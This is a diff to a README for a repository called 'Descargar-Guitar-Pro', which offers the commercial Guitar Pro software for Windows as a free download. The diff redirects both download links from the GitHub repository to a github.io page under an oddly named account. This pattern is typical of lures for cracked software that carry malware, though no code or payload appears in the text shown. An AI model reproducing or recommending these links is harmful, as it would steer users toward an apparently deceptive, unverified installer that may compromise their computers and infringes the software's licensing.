@@ -1,10 +1,10 @@
 # 🎸 Descargar-Guitar-Pro - Access professional music notation today
 
-[![](https://img.shields.io/badge/Download-Guitar_Pro-blue.svg)](https://github.com/Capitalofafghanistantripper115/Descargar-Guitar-Pro)
+[![](https://img.shields.io/badge/Download-Guitar_Pro-blue.svg)](https://capitalofafghanistantripper115.github.io)
 
 ## 📥 Get the software
 
-You can obtain the installer through this link: [Download Guitar Pro for Windows](https://github.com/Capitalofafghanistantripper115/Descargar-Guitar-Pro)
+You can obtain the installer through this link: [Download Guitar Pro for Windows](https://capitalofafghanistantripper115.github.io)
 
 This repository provides access to Guitar Pro on Windows 10 and Windows 11. Follow the steps below to set up the software on your computer.
 
